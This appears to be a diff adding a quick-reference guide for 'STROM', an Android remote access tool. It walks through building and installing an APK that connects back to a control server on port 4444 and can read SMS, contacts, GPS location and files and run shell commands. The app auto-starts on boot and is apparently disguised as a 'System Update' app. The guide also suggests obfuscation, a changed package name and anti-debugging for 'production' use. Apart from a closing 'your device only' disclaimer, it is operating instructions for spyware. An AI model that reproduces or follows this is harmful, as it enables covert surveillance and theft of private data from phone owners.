@@ -1,0 +1,195 @@
+╔════════════════════════════════════════════════════════════════╗
+║              ANDROID MODULE - QUICK REFERENCE                  ║
+╚════════════════════════════════════════════════════════════════╝
+
+📋 QUICK START (5 MENIT)
+══════════════════════════════════════════════════════════════════
+
+1. Jalankan STROM:
+   $ cd /home/attazy/strom
+   $ python3 strom.py
+   
+2. Pilih: [9] Android Remote Access
+
+3. Pilih: [6] Auto-Setup (All-in-One)
+
+4. Catat IP yang muncul (contoh: 172.27.237.119)
+
+5. Build APK di Android Studio:
+   - Edit android_payload/RemoteService.java
+   - Ganti SERVER_IP = "172.27.237.119" (dengan IP Anda)
+   - Build APK
+   
+6. Install APK di HP, grant permissions
+
+7. Control: Menu [5] Control Device
+
+
+📁 FILE STRUCTURE
+══════════════════════════════════════════════════════════════════
+
+android_payload/
+├── MainActivity.java          (Entry point + permission request)
+├── RemoteService.java         (Main service - EDIT IP HERE!)
+├── BootReceiver.java          (Auto-start after reboot)
+├── AndroidManifest.xml        (App configuration + permissions)
+├── build.gradle               (Build configuration)
+└── BUILD_INSTRUCTIONS.txt     (Detailed build guide)
+
+modules/
+└── android_access.py          (Server module)
+
+core/
+└── android_helper.py          (Payload generator)
+
+
+🔧 CONFIGURATION
+══════════════════════════════════════════════════════════════════
+
+File to Edit: android_payload/RemoteService.java
+
+Line 27-28:
+    private static final String SERVER_IP = "172.27.237.119";
+    private static final int SERVER_PORT = 4444;
+
+Change SERVER_IP to your computer's IP address!
+
+
+💻 AVAILABLE COMMANDS
+══════════════════════════════════════════════════════════════════
+
+[1] Screen Mirror      - Capture screenshot (needs root/special perm)
+[2] Capture Photo      - Take photo with camera (not fully impl)
+[3] Read SMS          - Read 50 latest SMS messages
+[4] Read Contacts     - Read up to 100 contacts
+[5] Get Location      - Get GPS coordinates
+[6] File Browser      - Browse files in specified path
+[7] Shell Command     - Execute shell commands
+[8] Device Info       - Get device information
+
+
+🔌 PORTS
+══════════════════════════════════════════════════════════════════
+
+4444  - Control Server (device connections)
+8080  - HTTP Server (serve APK files)
+
+
+🐛 COMMON ISSUES & FIXES
+══════════════════════════════════════════════════════════════════
+
+❌ Device tidak connect
+   ✓ Check IP address benar di RemoteService.java
+   ✓ Pastikan HP & komputer di jaringan yang sama
+   ✓ Server harus running sebelum buka app
+
+❌ App crash
+   ✓ Grant all permissions di Settings > Apps
+   ✓ Check logcat: adb logcat | grep RemoteService
+   
+❌ Permission denied
+   ✓ Manual grant: Settings > Apps > System Update > Permissions
+   ✓ Enable all permissions
+
+❌ Can't build APK
+   ✓ Install Android Studio
+   ✓ Add AndroidX dependencies
+   ✓ Sync Gradle
+
+
+📱 REQUIRED PERMISSIONS
+══════════════════════════════════════════════════════════════════
+
+✓ INTERNET               - Network communication
+✓ READ_SMS               - Read SMS messages
+✓ READ_CONTACTS          - Read contacts
+✓ ACCESS_FINE_LOCATION   - Get GPS location
+✓ CAMERA                 - Camera access
+✓ READ_EXTERNAL_STORAGE  - Read files
+✓ WRITE_EXTERNAL_STORAGE - Write files
+✓ RECEIVE_BOOT_COMPLETED - Auto-start
+
+
+🔍 TESTING CHECKLIST
+══════════════════════════════════════════════════════════════════
+
+□ Run validation: python3 test_android_module.py
+□ Note your IP address
+□ Edit SERVER_IP in RemoteService.java
+□ Build APK successfully
+□ Install APK on phone
+□ Grant all permissions
+□ Server running before opening app
+□ Device shows up in [4] View Connected Devices
+□ Test each command from [5] Control Device
+
+
+📊 DEBUG COMMANDS
+══════════════════════════════════════════════════════════════════
+
+# Check if server running
+$ netstat -tuln | grep 4444
+$ netstat -tuln | grep 8080
+
+# Get your IP
+$ ip addr show
+$ hostname -I
+
+# Test from phone (via ADB or terminal)
+$ ping <YOUR_COMPUTER_IP>
+$ telnet <YOUR_COMPUTER_IP> 4444
+
+# View Android logs
+$ adb logcat | grep RemoteService
+$ adb logcat | grep com.system.update
+
+
+⚡ PERFORMANCE TIPS
+══════════════════════════════════════════════════════════════════
+
+1. Use WiFi (not mobile data)
+2. Keep phone close to router
+3. Disable battery saver during testing
+4. Keep screen on for initial tests
+5. Use good quality WiFi (not public WiFi)
+
+
+🛡️ SECURITY NOTES
+══════════════════════════════════════════════════════════════════
+
+⚠️  Current Implementation:
+   - No encryption (plain text JSON)
+   - No authentication
+   - No code obfuscation
+   - For TESTING ONLY
+
+🔒 For Production (if needed):
+   - Add SSL/TLS encryption
+   - Implement authentication
+   - Obfuscate with ProGuard
+   - Change package name
+   - Add anti-debugging
+
+
+📚 DOCUMENTATION FILES
+══════════════════════════════════════════════════════════════════
+
+ANDROID_TESTING_GUIDE.md   - Complete testing guide
+BUILD_INSTRUCTIONS.txt      - APK build instructions
+test_android_module.py      - Validation script
+QUICK_REFERENCE.txt         - This file
+
+
+🚀 READY TO TEST?
+══════════════════════════════════════════════════════════════════
+
+1. Run: python3 test_android_module.py (verify all OK)
+2. Read: ANDROID_TESTING_GUIDE.md (detailed guide)
+3. Start: python3 strom.py → [9] → [6]
+4. Build & Install APK
+5. Test & Learn!
+
+
+═══════════════════════════════════════════════════════════════════
+             LEGAL USE ONLY - YOUR DEVICE ONLY
+═══════════════════════════════════════════════════════════════════
